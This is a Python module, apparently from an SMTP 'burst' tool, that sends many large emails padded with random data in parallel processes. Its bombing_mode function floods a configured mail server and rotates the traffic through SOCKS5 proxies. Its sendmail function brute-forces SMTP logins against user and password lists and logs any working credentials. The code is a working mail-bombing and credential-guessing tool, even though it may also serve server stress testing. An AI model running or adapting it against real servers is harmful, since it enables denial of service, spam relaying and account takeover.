import smtplib
import socket
import time
import sys
import logging
from smtplib import (
    SMTPException,
    SMTPSenderRefused,
    SMTPRecipientsRefused,
    SMTPDataError,
)
from typing import Tuple

from .config import Config
from . import datagen
from . import attacks

logger = logging.getLogger(__name__)


def appendMessage(cfg: Config) -> bytes:
    """Construct the message using config values and append random data."""
    receivers = ", ".join(cfg.SB_RECEIVERS)
    base = (
        f"From: {cfg.SB_SENDER}\n"
        f"To: {receivers}\n"
        f"Subject: {cfg.SB_SUBJECT}\n\n"
        f"{cfg.SB_BODY}\n\n"
    )
    rand = datagen.generate(
        cfg.SB_SIZE,
        mode=cfg.SB_DATA_MODE,
        secure=cfg.SB_SECURE_RANDOM,
        words=cfg.SB_DICT_WORDS,
        repeat=cfg.SB_REPEAT_STRING,
        stream=cfg.SB_RAND_STREAM,
    )
    return base.encode("ascii") + rand


def sizeof_fmt(num: int, suffix: str = 'B') -> str:
    """Return human readable file size."""
    for unit in ['', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi']:
        if abs(num) < 1024.0:
            return "%3.1f%s%s" % (num, unit, suffix)
        num /= 1024.0
    return "%.1f%s%s" % (num, 'Yi', suffix)


def sendmail(
    number: int,
    burst: int,
    SB_FAILCOUNT,
    SB_MESSAGE: bytes,
    cfg: Config,
    server: str | None = None,
    proxy: str | None = None,
    users=None,
    passwords=None,
    use_ssl: bool | None = None,
    start_tls: bool | None = None,
):
    """Send a single email if failure threshold not reached.

    Parameters ``use_ssl`` and ``start_tls`` control the connection security.
    """
    if server is None:
        server = cfg.SB_SERVER
    if use_ssl is None:
        use_ssl = cfg.SB_SSL
    if start_tls is None:
        start_tls = cfg.SB_STARTTLS

    if SB_FAILCOUNT.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
        return

    logger.info(f"%s/%s, Burst %s : Sending Email", number, cfg.SB_TOTAL, burst)
    host, port = parse_server(server)
    orig_socket = socket.socket
    if proxy:
        try:  # pragma: no cover - depends on PySocks
            import socks

            ph, pp = parse_server(proxy)
            socks.setdefaultproxy(socks.SOCKS5, ph, pp)
            socket.socket = socks.socksocket
        except Exception:
            pass
    try:
        smtp_cls = smtplib.SMTP_SSL if use_ssl else smtplib.SMTP
        with smtp_cls(host, port) as smtpObj:
            if start_tls and not use_ssl:
                smtpObj.starttls()
            if users and passwords:
                success = False
                for user in users:
                    for pwd in passwords:
                        try:
                            smtpObj.login(user, pwd)
                            logger.info("Auth success: %s:%s", user, pwd)
                            success = True
                            break
                        except SMTPException:
                            continue
                    if success:
                        break
            smtpObj.sendmail(cfg.SB_SENDER, cfg.SB_RECEIVERS, SB_MESSAGE)
        logger.info("%s/%s, Burst %s : Email Sent", number, cfg.SB_TOTAL, burst)
    except SMTPException:
        SB_FAILCOUNT.value += 1
        logger.error(
            "%s/%s, Burst %s/%s : Failure %s/%s, Unable to send email",
            number,
            cfg.SB_TOTAL,
            burst,
            cfg.SB_BURSTS,
            SB_FAILCOUNT.value,
            cfg.SB_STOPFQNT,
        )
    except SMTPSenderRefused:
        SB_FAILCOUNT.value += 1
        logger.error(
            "%s/%s, Burst %s : Failure %s/%s, Sender refused",
            number,
            cfg.SB_TOTAL,
            burst,
            SB_FAILCOUNT.value,
            cfg.SB_STOPFQNT,
        )
    except SMTPRecipientsRefused:
        SB_FAILCOUNT.value += 1
        logger.error(
            "%s/%s, Burst %s : Failure %s/%s, Recipients refused",
            number,
            cfg.SB_TOTAL,
            burst,
            SB_FAILCOUNT.value,
            cfg.SB_STOPFQNT,
        )
    except SMTPDataError:
        SB_FAILCOUNT.value += 1
        logger.error(
            "%s/%s, Burst %s : Failure %s/%s, Data Error",
            number,
            cfg.SB_TOTAL,
            burst,
            SB_FAILCOUNT.value,
            cfg.SB_STOPFQNT,
        )
    finally:
        if proxy:
            socket.socket = orig_socket


def parse_server(server: str) -> Tuple[str, int]:
    """Return ``(host, port)`` parsed from ``server`` string."""
    if ":" in server:
        host, port_str = server.rsplit(":", 1)
        try:
            port = int(port_str)
        except ValueError:
            port = 25
    else:
        host = server
        port = 25
    return host, port


def open_sockets(host: str, count: int, port: int = 25):
    """Delegate to :mod:`smtpburst.attacks` implementation."""
    return attacks.open_sockets(host, count, port)

def bombing_mode(cfg: Config) -> None:
    """Run burst sending autonomously using provided configuration."""
    from multiprocessing import Manager, Process

    logger.info("Generating %s of data to append to message", sizeof_fmt(cfg.SB_SIZE))
    manager = Manager()
    fail_count = manager.Value('i', 0)
    message = appendMessage(cfg)
    logger.info("Message using %s of random data", sizeof_fmt(sys.getsizeof(message)))

    for b in range(cfg.SB_BURSTS):
        if cfg.SB_PER_BURST_DATA:
            message = appendMessage(cfg)
        numbers = range(1, cfg.SB_SGEMAILS + 1)
        procs = []
        if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
            break
        for number in numbers:
            if fail_count.value >= cfg.SB_STOPFQNT and cfg.SB_STOPFAIL:
                break
            time.sleep(cfg.SB_SGEMAILSPSEC)
            proxy = None
            if cfg.SB_PROXIES:
                idx = (number + (b * cfg.SB_SGEMAILS) - 1) % len(cfg.SB_PROXIES)
                proxy = cfg.SB_PROXIES[idx]
            proc = Process(
                target=sendmail,
                args=(
                    number + (b * cfg.SB_SGEMAILS),
                    b + 1,
                    fail_count,
                    message,
                    cfg,
                ),
                kwargs={
                    'server': cfg.SB_SERVER,
                    'proxy': proxy,
                    'users': cfg.SB_USERLIST,
                    'passwords': cfg.SB_PASSLIST,
                },
            )
            procs.append(proc)
            proc.start()
        for proc in procs:
            proc.join()
        time.sleep(cfg.SB_BURSTSPSEC)

    if cfg.SB_RAND_STREAM:
        try:
            cfg.SB_RAND_STREAM.close()
        except Exception:
            pass
